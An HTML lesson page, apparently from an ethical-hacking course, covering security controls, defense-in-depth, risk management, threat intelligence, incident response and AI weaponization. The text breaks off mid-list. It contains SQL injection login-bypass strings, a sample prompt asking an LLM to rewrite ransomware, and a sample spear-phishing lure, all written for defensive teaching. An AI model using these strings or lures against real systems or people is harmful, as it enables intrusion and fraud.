@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Security Controls | ISCSECURITY Master Class Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="/css/styles.css?v=2026_PRODUCTION_FINAL" />
+  
+  <!-- MemberSpace -->
+  <script>
+    window.MemberSpace = window.MemberSpace || { subdomain: "iscsecurity" };
+    (function(d){
+      var s = d.createElement("script");
+      s.src = "https://cdn.memberspace.com/scripts/widgets.js";
+      s.async = true;
+      d.head.appendChild(s);
+    })(document);
+  </script>
+  
+</head>
+
+<body class="page-lesson">
+
+<div class="site-topbar" role="note" aria-label="Legal notice">
+  <small class="topbar-note">
+    © 2026 ISCSECURITY · Authorization-first training. All testing must be lawful, scoped, and approved in writing.
+  </small>
+  <nav class="topbar-links" aria-label="Topbar links">
+      <a href="https://iscsecurity.org/index">Home</a>
+      <a href="https://iscsecurity.org/content/index">Content</a>
+	  <a href="https://iscsecurity.org/content/1-ethical-hacking">Ethical Hacking</a>
+      <a href="https://iscsecurity.org/contact">Contact</a>
+    </nav>
+</div>
+
+<main class="page modules-page no-shift" id="ethical-hacking-training-content" data-ms-content="members-only">
+  <article class="lesson-content overlay" tabindex="0" aria-label="Lesson content: Information Security Controls">
+
+    <p class="breadcrumb">
+      <a href="https://iscsecurity.org/index">Home</a> →
+        <a href="https://iscsecurity.org/content/index">Content</a> →
+        <a href="https://iscsecurity.org/content/1-ethical-hacking">Ethical Hacking</a> →
+      <span aria-current="page">Page 6</span>
+    </p>
+
+    <h1>Information Security Controls</h1>
+	
+<!-- ============================================================ -->
+    <!-- AUTHORIZED USE BANNERS                                        -->
+    <!-- ============================================================ -->
+
+    <div class="reminder-auth">
+      <strong>🚨 AUTHORIZED USE ONLY:</strong>
+      <span>
+        All content in this document is for educational and defensive training purposes only.
+        The adversarial techniques described are derived from real-world tradecraft but
+        are documented exclusively for <strong>defensive analysis, detection engineering,
+        and authorized security testing</strong>. Unauthorized deployment of any technique
+        described may constitute a criminal offense under applicable national and
+        international cybercrime laws. Always obtain <strong>explicit written authorization</strong>
+        from the system owner or authorized legal entity before testing, executing, or
+        simulating any of the techniques outlined in this document.
+      </span>
+    </div>
+
+    <div class="reminder-comp">
+      <strong>🌍 INTERNATIONAL COMPLIANCE NOTICE:</strong>
+      <span>
+        Cybercrime laws vary significantly by jurisdiction. It's your sole responsibility
+        to understand and comply with the laws applicable to your location, the location
+        of any target systems, and your organization's policies. When in doubt,
+        <strong>consult a qualified legal professional</strong> before testing, executing,
+        or simulating any technique described in this document.
+      </span>
+    </div>
+
+<!-- ============================================================ -->
+<!-- EXECUTIVE SUMMARY                                             -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="executive-summary">
+      <h2>1. Executive Summary</h2>
+      <p>
+        <strong>Operational Premise:</strong> The previous section established the methodologies and kill-chain mechanics that guide how adversaries operate. 
+        Page 06 answers the natural corollary: <em>what defensive architecture, risk decisions, and intelligence processes exist to stop them?</em> 
+        Security controls are not products; they are the intentional design decisions that translate threat understanding into protective, detective, and responsive capabilities.
+      </p>
+      <p>
+        Having cleared the previous sectios gateway understanding ethical hacking lifecycles, TTPs, kill chains, and adversary progression, you are now 
+        cleared to study <strong>information assurance, defense-in-depth, risk management, cyber threat intelligence, incident response, and the role of AI/ML</strong> 
+        in modern defensive architecture.
+      </p>
+
+      <ul class="learning-objectives">
+        <li><strong>Objective 1:</strong> Understand the difference between security controls, information assurance, and defense-in-depth architecture.</li>
+        <li><strong>Objective 2:</strong> Apply risk management principles to prioritize defensive investments and treatment decisions.</li>
+        <li><strong>Objective 3:</strong> Recognize how adversaries exploit control gaps, AI weaponization, and incident response friction in the wild.</li>
+      </ul>
+	  
+	  </section>
+
+<!-- ============================================================ -->
+<!-- 🟢 BEGINNER LEVEL                                             -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="beginner-level">
+      <h2>2. Beginner Level</h2>
+      <p>
+        Foundational concepts for practitioners new to defensive architecture and security controls. Assume zero prior knowledge of risk management, CTI, or incident response frameworks.
+      </p>
+
+      <h3># Core Concepts</h3>
+      <p>
+        Information security controls are the guard rails that keep an organization’s information assets usable, trustworthy, and available. At a high level we are protecting:
+      </p>
+      <ul>
+        <li><strong>Confidentiality:</strong> Who is allowed to see the data</li>
+        <li><strong>Integrity:</strong> Whether the data is accurate and unchanged</li>
+        <li><strong>Availability:</strong> Whether the data and services are reachable when needed</li>
+      </ul>
+
+      <p>For people interacting with that data, we also care about:</p>
+      <ul>
+        <li><strong>Authentication:</strong> Proving who you are.</li>
+        <li><strong>Authorization:</strong> What you are allowed to do.</li>
+        <li><strong>Non-repudiation:</strong> Being unable to deny an approved action later.</li>
+      </ul>
+
+      <h3>Analogy / Context</h3>
+      <p>
+        Think of security controls as the locks, alarms, and guards protecting a bank vault. The locks (technical controls) keep unauthorized people out. The alarms (detective controls) alert when someone tries to break in. The guards (physical controls) respond when an alert is triggered. A bank that only installs locks without alarms or guards is still vulnerable; one with alarms but no locks will spend all its time responding to false alarms. Security controls must work together.
+      </p>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Key Principle:</strong> Information is your most valuable asset. Controls, processes, and people all have to work together to keep that asset safe while the business keeps moving.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- 🟡 INTERMEDIATE LEVEL                                         -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="intermediate-level">
+      <h2>3. Intermediate Level</h2>
+      <p>
+        Hands-on application of security controls, defense-in-depth architecture, risk management, CTI, and incident response in real environments.
+      </p>
+
+      <h3>Information Assurance (IA)</h3>
+      <p>
+        Information Assurance is about keeping information <strong>trustworthy</strong> throughout its life cycle, while it is stored, processed, or transmitted. IA combines technical, physical, and administrative controls to make sure only authorized people (or systems) can access and use information in acceptable ways.
+      </p>
+
+      <h3>Typical IA Activities</h3>
+      <ul>
+        <li><strong>Local policy and process design:</strong> Writing practical policies and procedures that keep systems at an acceptable security baseline.</li>
+        <li><strong>Network &amp; authentication strategy:</strong> Designing segmented networks, strong identity and access controls, and hardened endpoints.</li>
+        <li><strong>Vulnerability and threat identification:</strong> Running regular assessments to understand where you are exposed and how an attacker might move.</li>
+        <li><strong>Planning &amp; resourcing:</strong> Deciding what people, tools, and budget are needed to close the most important gaps.</li>
+        <li><strong>Certification &amp; Accreditation (C&amp;A):</strong> Formally checking that systems meet defined security requirements before they go live.</li>
+        <li><strong>Awareness &amp; training:</strong> Making sure everyone who touches information systems understands their responsibilities.</li>
+      </ul>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Key Outcome:</strong> When IA (Information Assurance) is done properly, you get two big wins: <strong>business 
+		continuity</strong> (the organization can keep operating) and <strong>reduced risk</strong> (attacks are harder, 
+		noisier, and more expensive for an adversary).
+      </div>
+
+      <h3>Continual / Adaptive Security Strategy</h3>
+      <p>
+        A static security program quickly becomes obsolete. An adaptive security strategy assumes that threats, technology, and the 
+		business will keep changing, so your controls must keep evolving as well. A simple way to frame this is:
+      </p>
+
+      <pre><code><strong>Protect → Detect → Respond → Predict</strong></code></pre>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Adaptive security phases">
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Purpose</th>
+              <th>Typical Activities</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Protect</strong></td>
+              <td>Reduce the attack surface up front.</td>
+              <td>Policies, hardening, patching, segmentation, access control, firewalls, endpoint security, secure configuration baselines.</td>
+            </tr>
+            <tr>
+              <td><strong>Detect</strong></td>
+              <td>Spot abnormal or malicious activity early.</td>
+              <td>Log collection, SIEM rules, NIDS/HIDS, packet capture, anomaly detection, regular monitoring of key telemetry.</td>
+            </tr>
+            <tr>
+              <td><strong>Respond</strong></td>
+              <td>Contain damage and restore normal operations.</td>
+              <td>Incident response playbooks, triage, containment, eradication, recovery, stakeholder communication, lessons learned.</td>
+            </tr>
+            <tr>
+              <td><strong>Predict</strong></td>
+              <td>Get ahead of "what's coming next".</td>
+              <td>Risk &amp; vulnerability assessments, attack surface analysis, consumption of threat intelligence, purple-team/emulation exercises.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="reminder" style="margin-top: 15px;">
+        <strong>For Red Teams:</strong> The adaptive model tells you <em>where</em> defenders are likely watching.
+      </div>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>For Blue Teams:</strong> It becomes a simple checklist: Are we actively doing all four phases or just buying "protect" products?
+      </div>
+
+      <h3># Defense-in-Depth</h3>
+      <p>
+        Defense-in-depth is the idea that no single control is perfect. Instead, you stack multiple layers so that when one fails, others still stand between the attacker and the crown jewels.
+      </p>
+
+      <h3>Defensive Layers &amp; Adversary Operations</h3>
+
+      <h3>Perimeter Layer</h3>
+      <ul>
+        <li><strong>Examples:</strong> Firewalls, Web Application Firewalls (WAF), VPN, DDoS Protection.</li>
+      </ul>
+      <div style="margin: 10px 0 20px 25px; border-left: 2px dashed rgba(255, 59, 59, 0.3); padding-left: 15px;">
+        <strong>Adversary Aspect (Entry Target):</strong><br>
+        "I need to find a port that is open and allowed through the firewall. If I can't brute force it, I'll look for a service vulnerability."
+      </div>
+
+      <h3>Network Layer</h3>
+      <ul>
+        <li><strong>Examples:</strong> Network Segmentation, Network Access Control (NAC), Internal Firewalls.</li>
+      </ul>
+      <div style="margin: 10px 0 20px 25px; border-left: 2px dashed rgba(255, 59, 59, 0.3); padding-left: 15px;">
+        <strong>Adversary Aspect (Lateral Movement):</strong><br>
+        "I'm in the DMZ. Can I ping the database server? If not, I need to hop through a web server that has access to both."
+      </div>
+
+      <h3>Endpoint Layer</h3>
+      <ul>
+        <li><strong>Examples:</strong> Endpoint Detection &amp; Response (EDR), Host Hardening, Application Control.</li>
+      </ul>
+      <div style="margin: 10px 0 20px 25px; border-left: 2px dashed rgba(255, 59, 59, 0.3); padding-left: 15px;">
+        <strong>Adversary Aspect (Stabilization):</strong><br>
+        "I dropped a shell. Is EDR going to kill my process? I might need to use 'mimikatz' or obfuscate my payload."
+      </div>
+
+      <h3>Application Layer</h3>
+      <ul>
+        <li><strong>Examples:</strong> Strict Input Validation, Strong Authorization Models, Granular Security Logging.</li>
+      </ul>
+      <div style="margin: 10px 0 20px 25px; border-left: 2px dashed rgba(255, 59, 59, 0.3); padding-left: 15px;">
+        <strong>Adversary Aspect (Exploitation):</strong><br>
+        "The input field doesn’t sanitize SQL. I can inject `' OR '1'='1` to bypass login."
+      </div>
+
+      <h3>Data Layer</h3>
+      <ul>
+        <li><strong>Examples:</strong> Data-at-Rest Encryption, Secure Backups, Tokenization Schemes, Data Loss Prevention (DLP).</li>
+      </ul>
+      <div style="margin: 10px 0 20px 25px; border-left: 2px dashed rgba(255, 59, 59, 0.3); padding-left: 15px;">
+        <strong>Adversary Aspect (Exfiltration):</strong><br>
+        "I have the files. Are they encrypted at rest? If so, do I have the key? If not, I need to steal the key first."
+      </div>
+
+      <div class="info-remember" style="margin-top: 15px;">
+        <strong>Remeber:</strong> A well-designed defense-in-depth strategy slows attackers down and gives defenders more chances to detect, respond, and 
+		recover.
+      </div>
+
+      <h3># Risk and Risk Management</h3>
+
+      <h3>What is Risk?</h3>
+      <p>
+        In security, <strong>risk</strong> is the combination of:
+      </p>
+      <ul>
+        <li>The <strong>likelihood</strong> that something bad will happen, and</li>
+        <li>The <strong>impact</strong> if it actually does.</li>
+      </ul>
+
+      <p>A common model is:</p>
+      <pre><code><strong>Risk = Threat × Vulnerability × Impact (or Asset Value)</strong></code></pre>
+
+      <p>You cannot remove all risk, but you can understand it, prioritize it, and decide what to do about it.</p>
+
+      <h3>Risk Levels &amp; Risk Matrix</h3>
+      <p>
+        A risk matrix helps you quickly classify risks by combining likelihood and consequence. Below is a simple example; each organization should tune the labels and thresholds to its own context.
+      </p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Risk matrix">
+          <thead>
+            <tr>
+              <th>Likelihood ↓ / Impact →</th>
+              <th>Insignificant</th>
+              <th>Minor</th>
+              <th>Major</th>
+              <th>Critical</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Rare</strong></td>
+              <td>Low</td>
+              <td>Low</td>
+              <td>Medium</td>
+              <td>Medium</td>
+            </tr>
+            <tr>
+              <td><strong>Unlikely</strong></td>
+              <td>Low</td>
+              <td>Medium</td>
+              <td>Medium</td>
+              <td>High</td>
+            </tr>
+            <tr>
+              <td><strong>Possible</strong></td>
+              <td>Medium</td>
+              <td>Medium</td>
+              <td>High</td>
+              <td>Extreme</td>
+            </tr>
+            <tr>
+              <td><strong>Likely</strong></td>
+              <td>Medium</td>
+              <td>High</td>
+              <td>High</td>
+              <td>Extreme</td>
+            </tr>
+            <tr>
+              <td><strong>Almost Certain</strong></td>
+              <td>High</td>
+              <td>High</td>
+              <td>Extreme</td>
+              <td>Extreme</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>This supports the simple exam-style equation:</p>
+      <pre><code><strong>Level of Risk = Consequence × Likelihood</strong></code></pre>
+
+      <h3>Risk Management Phases</h3>
+      <p>Risk management is the ongoing process of understanding and controlling risk so that it stays within what the organization 
+	  considers <strong>"acceptable".</strong></p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Risk management phases">
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Goal</th>
+              <th>Key Outputs</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Risk Identification:</strong></td>
+              <td>Discover what could go wrong.</td>
+              <td>List of risks, sources, causes, affected assets, and potential consequences.</td>
+            </tr>
+            <tr>
+              <td><strong>Risk Assessment:</strong></td>
+              <td>Understand likelihood and impact.</td>
+              <td>Risk ratings/matrix, prioritised list of what to tackle first.</td>
+            </tr>
+            <tr>
+              <td><strong>Risk Treatment:</strong></td>
+              <td>Decide what to do about each risk.</td>
+              <td>Controls to <em>reduce</em>, <em>avoid</em>, <em>transfer</em>, or <em>accept</em> each risk, implementation plans and owners.</td>
+            </tr>
+            <tr>
+              <td><strong>Risk Tracking &amp; Review:</strong></td>
+              <td>Check if controls still work.</td>
+              <td>Metrics, audits, updated risk register, lessons learned, improved controls.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3># Cyber Threat Intelligence (CTI)</h3>
+      <p>
+        Cyber Threat Intelligence is curated, contextual information about adversaries, their capabilities, and the threats they 
+		pose. It converts raw data about attacks <strong>"in the wild"</strong> into something your organization can actually act on.
+      </p>
+
+      <h3>Types of Threat Intelligence</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Types of threat intelligence">
+          <thead>
+            <tr>
+              <th>Type</th>
+              <th>Audience</th>
+              <th>Focus</th>
+              <th>Typical Sources</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Strategic:</strong></td>
+              <td>Executives, CISO, senior management</td>
+              <td>Big-picture risk, trends, attacker motives, high-level business impact.</td>
+              <td>OSINT, CTI vendors, ISACs/ISAOs, industry reports, geopolitical analysis.</td>
+            </tr>
+            <tr>
+              <td><strong>Tactical:</strong></td>
+              <td>SOC managers, architects, security engineers</td>
+              <td>Adversary TTPs, common tools, infrastructure, and campaigns.</td>
+              <td>Malware and campaign reports, forensic write-ups, vendor advisories.</td>
+            </tr>
+            <tr>
+              <td><strong>Operational:</strong></td>
+              <td>Incident responders, threat hunters, forensics teams</td>
+              <td>Specific threat actors and operations targeting your sector or organization.</td>
+              <td>Human intelligence, underground forums, closed communities, law enforcement, social media monitoring.</td>
+            </tr>
+            <tr>
+              <td><strong>Technical:</strong></td>
+              <td>SOC analysts, IR teams, automation systems</td>
+              <td>Short-lived Indicators of Compromise (IOCs): IPs, hashes, domains, URLs, C2 patterns.</td>
+              <td>IOC feeds, sandbox output, SIEM/EDR telemetry, vendor data streams.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="info-remember" style="margin-top: 15px;">
+        Advanced CTI programs blend all four types so that strategy, operations, and day-to-day detection all pull in the same 
+		direction.
+      </div>
+
+      <h3>Threat Intelligence Lifecycle</h3>
+      <p>
+        Threat intelligence is not <strong>"download a feed and hope for the best".</strong> It follows a lifecycle that turns raw 
+		data into useful, validated intelligence.
+      </p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Threat intelligence lifecycle">
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>What Happens</th>
+              <th>Key Questions</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Planning &amp; Direction:</strong></td>
+              <td>Define requirements, consumers, priorities, and scope of the intelligence program.</td>
+              <td>What do we need to know? For whom? To support which decisions?</td>
+            </tr>
+            <tr>
+              <td><strong>Collection:</strong></td>
+              <td>Gather raw data from internal logs and external sources (HUMINT, OSINT, sensors, third-party feeds, etc.).</td>
+              <td>Where will we get this data and how often?</td>
+            </tr>
+            <tr>
+              <td><strong>Processing &amp; Exploitation:</strong></td>
+              <td>Normalize, deduplicate, enrich, decrypt, translate, and structure data so that it is usable.</td>
+              <td>How do we convert raw events into consistent, queryable information?</td>
+            </tr>
+            <tr>
+              <td><strong>Analysis &amp; Production:</strong></td>
+              <td>Analysts interpret the processed data, identify patterns and threats, and produce finished intelligence (reports, 
+			  alerts, hunting packages).</td>
+              <td>What does this mean for <em>us</em>? What should we do about it?</td>
+            </tr>
+            <tr>
+              <td><strong>Dissemination &amp; Integration:</strong></td>
+              <td>Deliver intelligence to the right people and systems. Integrate IOCs and TTPs into tooling, collect feedback and 
+			  refine requirements.</td>
+              <td>Did this help? What needs to change for the next cycle?</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3># Threat Modeling</h3>
+      <p>
+        Threat modeling is a structured way to think about <strong>"how could this be attacked?"</strong> before and after a system 
+		goes live. It forces you to view the system through an attacker's lens, identify weak points, and design controls where they actually matter.
+      </p>
+
+      <h3>High-Level Goals</h3>
+      <ul>
+        <li>Identify relevant threats for a specific application or system.</li>
+        <li>Spot design-level vulnerabilities early, before they become expensive.</li>
+        <li>Improve security architecture and justify controls.</li>
+      </ul>
+
+      <h3>Typical Threat Modeling Steps</h3>
+      <ol>
+        <li><strong>Identify security objectives:</strong> What are we trying to protect and why?</li>
+        <li><strong>Create an application overview:</strong> Components, data flows, trust boundaries, deployment diagram.</li>
+        <li><strong>Decompose the application:</strong> Entry points, exit points, trust transitions, where data is validated or transformed.</li>
+        <li><strong>Identify threats:</strong> Use checklists, STRIDE, or attack libraries to ask, <strong>"What could go wrong here?"</strong></li>
+        <li><strong>Identify vulnerabilities &amp; mitigations:</strong> Map threats to specific weaknesses, then design controls and tests.</li>
+      </ol>
+
+      <div class="info-remember" style="margin-top: 15px;">
+        Keep threat modeling iterative. Revisit it when the design changes, new features arrive, or a fresh class of attack becomes 
+		relevant.
+      </div>
+
+      <h3># Incident Management</h3>
+      <p>
+        Incident management is the wider process that surrounds security incidents; spotting them, coordinating the response, 
+		restoring service, and learning from what happened. Incident response is one piece inside this larger function.
+      </p>
+
+      <h3>Core Goals of Incident Management</h3>
+      <ul>
+        <li>Detect and handle incidents quickly and consistently.</li>
+        <li>Limit business impact and downtime.</li>
+        <li>Improve service quality and resilience over time.</li>
+        <li>Increase staff awareness and readiness.</li>
+      </ul>
+
+      <h3>Typical Supporting Activities</h3>
+      <ul>
+        <li>Vulnerability and artifact analysis.</li>
+        <li>Security awareness training for staff.</li>
+        <li>Monitoring for intrusions and misuse.</li>
+        <li>Coordination across HR, legal, IT, and external providers.</li>
+      </ul>
+
+      <h3># Incident Handling &amp; Response (IH&amp;R)</h3>
+      <p>
+        Incident handling and response is the hands-on playbook for dealing with a real security incident. It's where all the 
+		theory suddenly becomes real, and every decision matters.
+      </p>
+      <p>
+        When something goes wrong i.e. a compromised workstation, a suspicious outbound connection, ransomware in early stages, 
+		an account behaving strangely, the incident response (IR) team steps in to contain the blast radius, preserve evidence, 
+		and restore stability.
+      </p>
+      <p>
+        IR is not just about technical skill. It's about coordination, discipline, and decision-making under pressure. A solid 
+		incident response program prevents a minor intrusion from becoming a full-blown organizational crisis.
+      </p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Incident response steps">
+          <thead>
+            <tr>
+              <th>Step</th>
+              <th>Focus</th>
+              <th>Examples &amp; Adversary Counter-Measures</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>1. Preparation:</strong></td>
+              <td>Be ready before anything happens.</td>
+              <td>Policies, playbooks, tooling, training, asset inventories, IR team roles.<br><em>Adversary:</em> Targeted ransomware groups wait for backup windows to strike.</td>
+            </tr>
+            <tr>
+              <td><strong>2. Recording &amp; Assignment:</strong></td>
+              <td>Capture and route the initial report.</td>
+              <td>Tickets, hotline, SOC alerts, first classification and owner assignment.</td>
+            </tr>
+            <tr>
+              <td><strong>3. Triage:</strong></td>
+              <td>Understand what you are dealing with.</td>
+              <td>Validate the incident, determine type, scope, severity, and priority.<br><em>Adversary:</em> Uses "Living off the Land" (LOLBin) tools to blend in with normal traffic.</td>
+            </tr>
+            <tr>
+              <td><strong>4. Notification:</strong></td>
+              <td>Inform the right stakeholders.</td>
+              <td>Management, legal, affected teams, third parties, regulators (if needed).</td>
+            </tr>
+            <tr>
+              <td><strong>5. Containment:</strong></td>
+              <td>Stop the bleeding.</td>
+              <td>Isolate hosts, block accounts or IPs, disable services.<br><em>Adversary:</em> Disconnects from C2 server to avoid detection during "dormancy".</td>
+            </tr>
+            <tr>
+              <td><strong>6. Evidence &amp; Forensics:</strong></td>
+              <td>Preserve and analyze what happened.</td>
+              <td>Log and disk collection, memory images, timeline analysis.<br><em>Adversary:</em> Wipes event logs or uses fileless malware to leave no disk traces.</td>
+            </tr>
+            <tr>
+              <td><strong>7. Eradication:</strong></td>
+              <td>Remove root cause and backdoors.</td>
+              <td>Patch vulnerabilities, clean or rebuild systems, remove malware.<br><em>Adversary:</em> Leaves a second backdoor (e.g., new cron job) if only one is removed.</td>
+            </tr>
+            <tr>
+              <td><strong>8. Recovery:</strong></td>
+              <td>Bring systems safely back into production.</td>
+              <td>Restore from backups, validate integrity, increase monitoring.<br><em>Adversary:</em> Waits for the network to go quiet before re-infecting.</td>
+            </tr>
+            <tr>
+              <td><strong>9. Post-Incident Activities:</strong></td>
+              <td>Capture lessons and close the loop.</td>
+              <td>After-action review, update policies and playbooks.<br><em>Adversary:</em> Studies public reports to see if defenders learned their TTPs.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- 🔴 ADVANCED / OPERATOR LEVEL                                  -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="advanced-level">
+      <h2>4. Advanced / Operator Level</h2>
+      <p>
+        Deep technical detail for operators conducting authorized assessments, purple-team exercises, or incident-response engagements. This level covers AI/ML in security, AI weaponization, and the architecture of modern defensive programs.
+      </p>
+
+      <h3>Role of AI and ML in Cyber Security</h3>
+      <p>
+        Modern environments create more data than human analysts can realistically review. Artificial Intelligence (AI) and Machine Learning (ML) help by automating pattern detection, anomaly spotting, and repetitive decision-making. Used correctly, they amplify both offensive and defensive capabilities.
+      </p>
+
+      <h3>ML Basics</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Machine learning types">
+          <thead>
+            <tr>
+              <th>Type</th>
+              <th>Description</th>
+              <th>Security Examples</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Supervised Learning:</strong></td>
+              <td>Models train on labelled data ("this is benign", "this is malicious") and learn to classify new samples.</td>
+              <td>Spam/phishing classification, malware family classification, fraud detection.</td>
+            </tr>
+            <tr>
+              <td><strong>Unsupervised Learning:</strong></td>
+              <td>Models look for structure in unlabeled data and group similar items.</td>
+              <td>Anomaly detection on network flows, clustering similar alerts or user behaviours.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Where AI/ML Help Defenders</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="AI/ML defensive applications">
+          <thead>
+            <tr>
+              <th>Area</th>
+              <th>How AI / ML Assist</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Password &amp; Authentication Security:</strong></td>
+              <td>Behavioural biometrics, adaptive MFA, anomaly detection on login locations, devices and patterns.</td>
+            </tr>
+            <tr>
+              <td><strong>Phishing Detection:</strong></td>
+              <td>Classifying emails and URLs, spotting look-alike domains, suspicious content, or attachment behaviour at scale.</td>
+            </tr>
+            <tr>
+              <td><strong>Threat &amp; Anomaly Detection:</strong></td>
+              <td>Learning "normal" network or endpoint behaviour, then flagging outliers for analyst review.</td>
+            </tr>
+            <tr>
+              <td><strong>Vulnerability Management:</strong></td>
+              <td>Prioritising findings based on exploitability, external threat data, and business context instead of raw CVSS.</td>
+            </tr>
+            <tr>
+              <td><strong>Behavioural Analytics:</strong></td>
+              <td>Building user and entity behaviour baselines (UEBA) to detect credential theft and insider threats.</td>
+            </tr>
+            <tr>
+              <td><strong>Network Security:</strong></td>
+              <td>Automatically mapping network flows, segmenting assets, and proposing or tuning firewall policies.</td>
+            </tr>
+            <tr>
+              <td><strong>AI-Driven AV &amp; EDR:</strong></td>
+              <td>Behaviour-based malware detection rather than static signature matching, catching novel or obfuscated samples.</td>
+            </tr>
+            <tr>
+              <td><strong>Fraud &amp; Botnet Detection:</strong></td>
+              <td>Identifying unusual payment patterns, spotting automated traffic, and correlating signals across large volumes of events.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="reminder" style="margin-top: 15px;">
+        Of course, attackers can also weaponise AI, for better phishing, evasive malware, or automated reconnaissance. 
+		Which means defenders must constantly evolve their use of AI as well.
+      </div>
+
+      <h3>Examples of AI Weaponization</h3>
+      <p>Attackers are not just using AI to write code, they are using it to outpace traditional defenses.</p>
+
+      <h3>Polymorphic Malware Generation</h3>
+      <ul>
+        <li><strong>The Attack:</strong> Traditional antivirus relies on signatures or digital fingerprints. Changing a single line of code alters the signature, allowing the malware to bypass classic scanners.</li>
+        <li><strong>AI Weaponization:</strong> Attackers leverage LLMs to automatically rewrite malware structures, swap variable names, and modify execution logic while maintaining the underlying malicious capabilities.</li>
+      </ul>
+
+      <pre><code>[Adversary Prompt Input]
+"Rewrite this Python ransomware script to use different encryption libraries and obfuscate file paths, but keep the core logic."</code></pre>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Defender Counter-Measure (Behavioral Analysis):</strong><br>
+        Transition from signature-based tools to real-time behavioral analysis engines. Deploy machine learning models designed to flag any system process that rapidly encrypts hundreds of files, regardless of the binary signature structure.
+      </div>
+
+      <h3>Hyper-Personalized Phishing (Spear Phishing)</h3>
+      <ul>
+        <li><strong>The Attack:</strong> Classic social engineering lures are generic, mass-distributed, and regularly caught by basic email filters due to structural layout indicators.</li>
+        <li><strong>AI Weaponization:</strong> Attackers scrape target OSINT data from public profiles and press releases. The model crafts a highly tailored email mirroring an executive's precise writing style and referencing active internal projects.</li>
+      </ul>
+
+      <pre><code>[AI-Generated Phishing Lure]
+"Hi Sarah, just reviewing the Q3 merger docs we discussed in Berlin last month. Can you approve the attached invoice? Thanks, John."</code></pre>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Defender Counter-Measure (Semantic NLP Monitoring):</strong><br>
+        Deploy Natural Language Processing sensors to constantly analyze email streams for structural shifts in conversational 
+		tone, urgency, or context, flagging anomalies automatically if request profiles do not align with baseline communications.
+      </div>
+
+      <h3>Automated Vulnerability Discovery</h3>
+      <ul>
+        <li><strong>The Attack:</strong> Manual offensive validation paths are resource-heavy, while standard signature-based scanners are exceptionally noisy and regularly miss deep business logic flaws.</li>
+        <li><strong>AI Weaponization:</strong> Automated autonomous bots crawl target footprints, isolate input handlers, and evaluate thousands of injection variants per second. The agent actively parses server response delays or error exceptions to refine subsequent payloads.</li>
+      </ul>
+
+      <pre><code>[Automated Adversary Action Loop]
+Bot evaluates ' OR '1'='1', transitions to admin'--, and automatically generates custom payloads based on database feedback loops to map the SQLi vector in 30 seconds.</code></pre>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Defender Counter-Measure (AI-Driven WAF Rules):</strong><br>
+        Implement web application firewalls utilizing deep traffic pattern analysis engines to establish dynamic operational 
+		baselines and auto-block aggressive, high-speed probing vectors before an exploit payload can be successfully compiled.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- ⚫ ADVERSARIAL LEVEL                                          -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="adversarial-level">
+      <h2>5. Adversarial Level</h2>
+      <p>
+        Threat actor perspective. Advanced persistent threats, criminal groups, and red teams do not ignore security controls, they 
+		study them to locate the gap between documented policy and ground-truth implementation.
+      </p>
+
+      <h3># Threat Actor Behavior</h3>
+
+      <h3>Control Gaps &amp; Bypass Techniques</h3>
+      <ul>
+        <li>Target organizations that treat security controls as <strong>"set and forget"</strong> rather than continuously tested and tuned.</li>
+        <li>Exploit compensating control waivers that were accepted <strong>"temporarily"</strong> but never revisited.</li>
+        <li>Probe for segmentation gaps between less-scoped corporate VLANs and high-security Cardholder Data Environments (CDE).</li>
+        <li>Weaponize AI for polymorphic malware generation, hyper-personalized phishing, and automated vulnerability discovery.</li>
+      </ul>
+
+      <h3>Incident Response Friction</h3>
+      <ul>
+        <li>Launch attacks during weekends or holidays when IR teams are understaffed and response times are slower.</li>
+        <li>Use <strong>"Living off the Land"</strong> (LOLBin) tools to blend with normal administrative traffic and delay triage.</li>
